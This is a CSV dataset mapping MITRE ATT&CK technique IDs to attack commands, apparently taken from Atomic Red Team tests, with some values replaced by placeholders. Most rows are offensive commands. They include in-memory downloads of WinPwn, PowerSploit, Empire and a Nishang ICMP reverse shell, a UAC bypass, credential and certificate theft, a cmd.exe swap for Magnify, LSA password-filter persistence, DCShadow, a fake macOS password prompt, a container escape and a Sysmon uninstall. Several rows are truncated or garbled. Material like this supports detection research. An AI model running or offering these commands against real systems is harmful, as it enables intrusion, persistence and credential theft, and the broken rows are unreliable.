mitre_id,command
T1526,"import-module  ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1""  $access_key  =  ""var_325"""
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive\t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1133,"$extlist = var_879 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1574,copy  %windir%\system32\windowspowershell\v1.0\powershell.exe  %appdata%\updater.exe  copy  %windir%\system32\amsi.dll  %appdata%\amsi.dll  %appdata%\updater.exe  -command  exit
T1123,$mic  =  get-audiodevice  -recording  set-audiodevice  -id  $mic.id  start-sleep  -seconds  5
T1112,"reg add ""hklm\software\microsoft\windows nt\currentversion\event viewer"" /v microsoftredirectionurl /t reg_sz /d ""#{redirection_url}"" /f"
T1219,"start-process  ""var_792"""
T1046,docker build -t t1046 $pathtoatomicsfolder\t1046\src\ docker run --name t1046_container --rm -d -t t1046 docker exec t1046_container \scan.sh
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt
T1129,"var_705"""
T1552,findstr /s cpassword %logonserver%\sysvol\*.xml
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  3"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1547,"set-itemproperty  ""hklm:\software\microsoft\active  setup\installed  components\{c9e9a340-d1f1-11d0-821e-444553540600}""  ""stubpath""  ""var_655""  -force  &  $env:systemroot\system32\runonce.exe  \alternateshellstartup"
T1548,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') uacbypass -noninteractive -command ""c:\windows\system32\cmd.exe"" -technique diskcleanup"
T1078,"dscl . -create \users\atomicuser dscl . -create \users\atomicuser usershell \bin\bash dscl . -create \users\atomicuser realname ""atomic user"" dscl . -create \users\atomicuser uniqueid 503 dscl . -create \users\atomicuser primarygroupid 503 dscl . -create \users\atomicuser nfshomedirectory \local\users\atomicuser dscl . -passwd \users\atomicuser mysecretpassword dscl . -append \groups\admin groupmembership atomicuser"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_623"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  2"
T1613,docker  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  docker  run  --name  t1613_container  --rm  -d  -t  t1613  docker  ps  docker  stats  --no-stream  docker  inspect  $(docker  ps  -l  -q  --filter  ancestor=t1613)
T1562,sysmon -u
T1124,net time \\var_718 w32tm \tz
T1039,"copy-item -path ""\\var_952"""
T1082,$s3cur3th1ssh1t_repo = 'https:\\raw.githubusercontent.com\s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') otherchecks -noninteractive -consoleoutput
T1135,df -ah smbutil view -g \\var_358
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress var_930
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_822\extension\"" -passthru"
T1020,"$filename = ""var_419"
T1530,"$storage_account_objects = import-csv -path ""var_487"
T1218,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_363"""
T1552,reg query hkcu\software\simontatham\putty\sessions \t reg_sz \s
T1566,$url  =  'https:\\github.com\redcanaryco\atomic-red-team\raw\master\atomics\t1566.001\bin\phishingattachment.xlsm'  [net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  invoke-webrequest  -uri  $url  -outfile  $env:temp\phishingattachment.xlsm
T1571,test-netconnection -computername #{domain} -port #{port}
T1546,if not exist c:\windows\system32\magnify_backup.exe (copy c:\windows\system32\magnify.exe c:\windows\system32\magnify_backup.exe) else ( pushd ) takeown /f c:\windows\system32\magnify.exe /a icacls c:\windows\system32\magnify.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\magnify.exe
T1059,"which_python=$(which python || which python3 || which python3.9 || which python2) echo 'import requests' > #{python_script_name} echo 'import os' >> #{python_script_name} echo 'url = ""#{script_url}""' >> #{python_script_name} echo 'malicious_command = ""#{executor} #{payload_file_name} #{script_args}""' >> #{python_script_name} echo 'session = requests.session()' >> #{python_script_name} echo 'source = session.get(url).content' >> #{python_script_name} echo 'fd = open(""#{payload_file_name}"", ""wb+"")' >> #{python_script_name} echo 'fd.write(source)' >> #{python_script_name} echo 'fd.close()' >> #{python_script_name} echo 'os.system(malicious_command)' >> #{python_script_name} $which_python -c 'import py_compile; py_compile.compile(""#{python_script_name}"", ""#{python_binary_name}"")' $which_python #{python_binary_name}"
T1222,chown -r var_522
T1195,"kubectl run var_248 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1047,"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")"
T1482,nltest \domain_trusts nltest \trusted_domains
T1204,"invoke-webrequest -outfile $env:temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/bin/test10.lnk"" $file1 = ""$env:temp\test10.lnk"" start-process $file1 start-sleep -s 10 taskkill /im a.exe /f"
T1115,apt  install  xclip  -y  history  |  tail  -n  30  |  xclip  -sel  clip  xclip  -o  >  history.txt
T1555,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') decryptteamviewer -consoleoutput -noninteractive
T1036,"mkdir $home\... cp $(which sh) $home\... $home\...\sh -c ""echo var_870"""
T1652,kextstat
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1482,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1' -usebasicparsing); get-foresttrust -verbose
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_869
T1137,"copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelvbaaddin.xlam"" ""$env:appdata\microsoft\excel\xlstart\notepad.xlam"" start-process ""excel"""
T1505,"$termsrvdll = ""%systemroot%\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path ""%systemroot%\system32\termsrv.dll"" -destination ""%systemroot%\system32\termsrv_backup.dll"" -erroraction ignore add-content -path ""%systemroot%\system32\termsrv.dll"" -value ""`n"" -nonewline -erroraction ignore move-item -path ""%systemroot%\system32\termsrv_backup.dll"" -destination ""%systemroot%\system32\termsrv.dll"" -force -erroraction ignore"
T1046,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') bluekeep -noninteractive -consoleoutput
T1127,"var_606"""
T1021,"echo  """"  |  ""var_228""  ""vim-cmd  hostsvc\enable_ssh"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)"
T1095,iex  (new-object  system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1')  invoke-powershellicmp  -ipaddress  var_962
T1556,"sudo sed -i ""var_719"
T1580,aws ec2 describe-security-groups --profile var_945
T1187,"iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\powersharppack\master\powersharpbinaries\invoke-internalmonologue.ps1') invoke-internalmonologue -command ""-downgrade true -impersonate true -restore true"""
T1187,"iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\powersharppack\master\powersharpbinaries\invoke-internalmonologue.ps1') invoke-internalmonologue -command ""-downgrade true -impersonate true -restore true"""
T1497,"if [ ""$(csrutil status | grep -v 'enabled')"" != """" ]; then echo 'possible virtualization environment detected'; fi;"
T1217,"find \ -path ""*\safari\bookmarks.plist"" 2>\dev\null >> var_921"
T1041,if(-not (test-path var_499 -method post -body $filecontent -disablekeepalive
T1090,networksetup -setwebproxy var_899
T1615,"powershell -nop -exec bypass -c ""iex (new-object net.webclient).downloadstring('https:\\github.com\bc-security\empire\blob\86921fbbf4945441e2f9d9e7712c5a6e96eed0f3\empire\server\data\module_source\situational_awareness\network\powerview.ps1'); get-domaingpo"""
T1134,"start-process ""var_637"" -argument ""-u:t -p:e cmd"" start-sleep -second 5 stop-process -name ""cmd"" -force -erroraction silentlycontinue"
T1197,start-bitstransfer  -priority  foreground  -source  var_743
T1007,launchctl list
T1069,"net groups ""account operators"" /domain net groups ""exchange organization management"" /domain net group ""builtin\backup operators"" /domain net group ""domain admins"" /domain"
T1614,var_761
T1613,podman build -t t1613 $pathtoatomicsfolder\t1613\src\ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)
T1619,"az login # login to azure # get all storage accounts in the subscription $storageaccounts = az storage account list --query ""[].{name:name, resourcegroup:resourcegroup}"" --output json | convertfrom-json $storageaccountobjects = @() $downloadedfunctionfiles = @() foreach ($account in $storageaccounts) { write-output ""`nfound storage account $($account.name)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = """" } $allowsharedkeyaccess = az storage account show --name $account.name --resource-group $account.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name $account.name --resource-group $account.resourcegroup --query connectionstring --output tsv $fileshares = az storage share list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($fileshare in $fileshares) { write-output ""found file share: $($fileshare)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = $fileshare containername = """" blobname = """" tablename = """" queuename = """" } } $containers = az storage container list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($container in $containers) { write-output ""found container: $($container)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = """" tablename = """" queuename = """" } $blobs = az storage blob list --connection-string $connectionstring --container-name $container --query ""[].name"" --output json | convertfrom-json foreach($blob in $blobs) { write-output ""found blob: $($blob)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = $blob tablename = """" queuename = """" } } } $tables = az storage table list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($table in $tables) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = $table queuename = """" } } $queues = az storage queue list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($queue in $queues) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = $queue } } } } # store file lists to csv file $storageaccountobjects | export-csv -path ""var_930"" # print lists that have been stored as csv file $storageaccountobjects | format-table -property resourcegroup, storageaccountname, filesharename, containername, blobname, tablename, queuename -autosize -wrap"
T1611,"kubectl  --context  kind-atomic-cluster  run  atomic-nsenter-escape-pod  --restart=never  -ti  --rm  --image  alpine  --overrides  '{""spec"":{""hostpid"":  true,  ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=\proc\1\ns\mnt"",""--"",""\bin\bash""],""stdin"":  true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'"
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_238"""
T1580,"export aws_region=var_263 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1187,rpcping -s #{server_ip} -e #{custom_port} /a connect /u ntlm 1>$null
T1056,"pwd_spoof=$(osascript  -e  'display  dialog  ""to  perform  a  security  update  macos  needs  your  passphrase.""  with  title  ""macos  security  update""  default  answer  """"  with  icon  stop  with  hidden  answer')  echo  $pwd_spoof"
T1016,"""var_411"""
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1021,"cmd.exe  \c  ""net  use  \\var_925"""
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1069,"new-item -path ""#{output_path}"" -itemtype directory > $null & ""#{sharphound_path}"" -d ""#{domain}"" --collectionmethod localadmin --nosavecache --outputdirectory ""#{output_path}"""
T1609,kubectl create -f var_788
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_892"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1059,powershell.exe -e var_550
T1119,sc query type=service > %temp%\t1119_1.txt doskey \history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1556,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""var_638"" -destination ""%systemroot%\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $authenticationpackagesvalues = $lsakey.getvalue(""authentication packages"") $authenticationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""authentication packages"" $authenticationpackagesvalues"
T1033,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe \all >> var_783\$file"
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""var_675"" -credential $creds"
T1072,"""%programfiles(x86)%\var_403"""
T1572,c:\users\public\ngrok\ngrok.exe config add-authtoken var_783 | out-null start-sleep -s 5 stop-job -name job1 | out-null
T1560,"which_python=`which python || which python3` $which_python -c ""import gzip;input_file=open('var_608','wb',compresslevel=6);output_file.write(content);output_file.close();"""
T1531,net user var_900 \delete
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_171"" net start sesshijack"
T1572,c:\users\public\ngrok\ngrok.exe config add-authtoken var_457 | out-null start-sleep -s 5 stop-job -name job1 | out-null
T1543,sc.exe  create  var_485
T1555,python3 #{lazagne_path}/lazagne.py #{specific_module} >> #{output_file}
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1056,"prompt_command='history  -a  >(tee  -a  ~\.bash_history  |logger  -t  ""$user[$$]  $ssh_connection  "")'  echo  ""\$prompt_command=$prompt_command""  tail  \var\log\syslog"
T1490,sudo tmutil disable
T1137,"# registry setting to ""trust access to the vba project object model"" in word $registrykey = ""hkcu:software\microsoft\office\16.0\word\security"" $registryvalue = ""accessvbom"" $registrydata = ""1"" # the path where a flag text file will be created if registry setting did not already exist or if it was set to 0 $flagpath1 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag1.txt"" $flagpath2 = ""$env:userprofile\appdata\roaming\microsoft\templates\t1137-001_flag2.txt"" # get the value of the key\value pair $value = (get-itemproperty -path $registrykey -name $registryvalue -erroraction silentlycontinue).$registryvalue # logical operation to: if the value of the key\value is 1, do nothing - # if the value is 0, change it to 1 and create flag1 - # if it doesn't exist, create the value and flag2 if ($value -eq ""1"") { write-host ""the registry value '$registryvalue' already exists with the required setting."" } elseif ($value -eq ""0"") { write-host ""the registry value was set to 0, temporarily changing to 1."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag1"" > $flagpath1 } else { write-host ""the registry value '$registryvalue' does not exist, temporarily creating it."" new-itemproperty -path $registrykey -name $registryvalue -value $registrydata -propertytype dword -force | out-null echo ""flag2"" > $flagpath2 } add-type -assemblyname microsoft.office.interop.word # define the path of copied normal template for restoral $copypath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal1.dotm"" # define the path to the normal template $docpath = ""$env:userprofile\appdata\roaming\microsoft\templates\normal.dotm"" # create copy of orginal template for restoral copy-item -path $docpath -destination $copypath -force # vba code to be insterted as a macro # will create a scheduled task to open the calculator at 8:04pm daily $vbacode = @"" sub autoexec() dim applicationpath as string dim taskname as string dim runtime as string dim schtaskscmd as string applicationpath = ""%systemroot%\system32\calc.exe"" taskname = ""opencalctask"" runtime = ""20:04"" schtaskscmd = ""schtasks \create \tn """""" & taskname & """""" \tr """""" & applicationpath & """""" \sc daily \st "" & runtime & "" \f"" shell ""cmd.exe \c "" & schtaskscmd, vbnormalfocus end sub ""@ # create a new instance of word.application $word = new-object -comobject word.application # keep the word application hidden $word.visible = $false # open the document $document = $word.documents.open($docpath) # access the vba project of the document $vbaproject = $document.vbproject # add a new module to the vba project $newmodule = $vbaproject.vbcomponents.add(1) # 1 = vbext_ct_stdmodule # add the vba code to the new module $newmodule.codemodule.addfromstring($vbacode) # run the macro $word.run(""autoexec"") # save and close the document $document.saveas($docpath) $document.close() # quit word $word.quit() # release com objects [system.runtime.interopservices.marshal]::releasecomobject($document) | out-null [system.runtime.interopservices.marshal]::releasecomobject($word) | out-null [system.runtime.interopservices.marshal]::releasecomobject($vbaproject) | out-null [system.runtime.interopservices.marshal]::releasecomobject($newmodule) | out-null"
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_391 -method post -body $cyphertext -disablekeepalive"
T1069,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\master\recon\powerview.ps1' -usebasicparsing); get-domaingroupmember ""domain admins"""
T1115,echo ifconfig | pbcopy $(pbpaste)
T1518,"get-service windefend #check the service state of windows defender get-mpcomputerstatus #provides the current status of security solution elements, including anti-spyware, antivirus, loavprotection, real-time protection, etc get-mpthreat #threats details that have been detected using ms defender"
T1543,sc.exe  create  var_566
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_585"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1113,"cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12 add-type -memberdefinition '[dllimport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cbuttons, int info);' -name u32 -namespace w; [w.u32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c ""timeout #{recording_time} > null && psr.exe /stop"""
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } $ver = $excelapp.version $excelregpath=""hkcu:\software\microsoft\office\$ver\excel\options"" remove-item $excelregpath -erroraction ignore new-item -type directory $excelregpath | out-null new-itemproperty $excelregpath open -value ""/r notepad.xll"" -propertytype string | out-null $excelapp.quit() start-process ""excel"""
T1496,yes  >  \dev\null
T1547,"$runoncekey  =  ""var_708  ""iex  (new-object  net.webclient).downloadstring(`""https:\\github.com\redcanaryco\atomic-red-team\raw\master\atomics\t1547.001\src\discovery.bat`"")""'"
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_235"""
T1543,"new-service -name ""var_578"""
T1572,"set-location  ""pathtoatomicsfolder""  .\t1572\src\t1572-doh-domain-length.ps1  -dohserver  var_807"
T1127,"copy ""var_375 %temp%\hello.js"
T1003,"rundll32.exe keymgr,krshowkeymgr"
T1546,"add-content #{ps_profile} -value """" add-content #{ps_profile} -value ""start-process #{exe_path}"" powershell -command exit"
T1482,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=organizationalunit) var_762"
